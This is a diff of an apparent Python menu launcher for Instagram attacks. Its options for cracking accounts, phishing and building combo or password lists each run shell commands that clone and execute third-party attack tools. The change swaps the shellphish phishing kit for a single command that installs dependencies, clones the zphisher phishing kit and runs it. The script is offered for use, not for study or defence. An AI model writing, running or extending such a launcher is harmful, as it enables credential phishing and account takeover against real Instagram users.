@@ -23,10 +23,7 @@ if x=="crack insta":
 	os.system("pip install -r requirements.txt")
 	os.system("python instagram.py -h")
 if x=="phishing insta":
-	os.system("git clone https://github.com/thelinuxchoice/shellphish")
-	os.system("cd shellphish")
-	os.system("pkg install php")
-	os.system("bash shellphish.sh")
+	os.system("apt update && apt install git php curl openssh -y && git clone https://github.com/htr-tech/zphisher && cd zphisher && chmod +x zphisher.sh && bash zphisher.sh")
 if x=="proxy_combo_passlist":
 	os.system("git clone https://github.com/Mobin-Dan/pass_combo_proxy")
 	os.system("cd pass_combo_proxy")
